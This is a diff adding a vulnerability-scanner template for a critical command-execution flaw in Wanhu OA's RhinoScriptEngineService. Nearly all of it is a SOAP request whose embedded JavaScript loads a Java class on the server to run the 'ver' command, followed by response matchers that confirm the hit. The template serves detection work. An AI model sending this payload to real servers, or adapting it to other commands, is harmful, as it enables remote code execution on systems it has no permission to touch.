@@ -1,0 +1,54 @@
+id: poc-yaml-wan-hu-rhinoscriptengineservice-command-execution
+info:
+  name: 万户OA RhinoScriptEngineService 命令执行漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+  description: |
+    This template detects a command execution vulnerability in 万户OA RhinoScriptEngineService.
+http:
+  - method: POST
+    path:
+      - /defaultroot/services/./././RhinoScriptEngineService
+    headers:
+      Content-Type: text/xml; charset=utf-8
+      SOAPAction: ""
+    body: |-
+      <?xml version='1.0' encoding='UTF-8'?>
+      <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:jav="http://javascript.script.sun.com">
+      <soapenv:Body>
+      <eval xmlns="http://127.0.0.1:8080/services/scriptEngine">
+        <arg0 xmlns="">
+          <![CDATA[
+          try {
+          load("nashorn:Mozilla_compat.js");
+          } catch (e) {
+          }
+          importPackage(Packages.java.io);
+          importPackage(Packages.java.lang);
+          importPackage(Packages.java.util);
+          importPackage(Packages.java.net);
+
+          new URLClassLoader([new File('../server').toURL()]).loadClass('Test12').getConstructor([Class.forName("java.lang.String")]).newInstance(["ver"]).toString()
+
+          ]]>
+        </arg0>
+        <arg1 xmlns="" xsi:type="urn:SimpleScriptContext" xmlns:urn="urn:beanservice">
+        </arg1>
+      </eval>
+      </soapenv:Body>
+      </soapenv:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "text/xml"
+      - type: word
+        part: body
+        words:
+          - "<soapenv:Body>"
+          - "Microsoft Windows"
